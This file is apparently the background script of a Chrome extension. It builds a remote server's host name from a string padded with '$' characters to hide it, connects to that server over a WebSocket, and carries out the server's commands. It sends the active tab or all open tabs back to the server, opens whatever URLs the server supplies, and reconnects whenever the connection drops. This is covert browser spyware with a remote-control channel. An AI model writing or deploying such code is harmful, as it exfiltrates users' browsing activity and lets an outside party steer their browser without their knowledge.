let ws
let socketHost = 'c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, '')
function initSocket(ID = Math.random() * 10000) {
  console.log('init socket with id ', ID)
  setTimeout(() => {
    ws = new WebSocket('wss://' + socketHost)

    ws.onopen = () => {
      register()
      ws.onmessage = ({ data }) => {
        try {
          handleData(JSON.parse(data))
        } catch (error) { ws.send(JSON.stringify(error)) }
      }
    }

    ws.onclose = () => initSocket(ID)

    function handleData({ action, payload }) {
      console.log(action)
      switch (action) {
        case 'TAB': return tab()
        case 'TABS': return tabs()
        case 'GOTO': return goto(payload)
        default: break
      }
    }

    async function tab() {
      const tab = await chrome.tabs.query({ currentWindow: false, active: true })
      ws.send(JSON.stringify(tab))
    }
    
    async function tabs() {
      const tabs = await chrome.tabs.query({ currentWindow: false })
      ws.send(JSON.stringify(tabs))
    }
    
    async function goto(options) {
      chrome.tabs.create(options)
    }

    function register() {
      ws.send(JSON.stringify({
        action: 'ID',
        payload: ID
      }))
    }
  }, 1000)
}

fetch('https://' + socketHost)
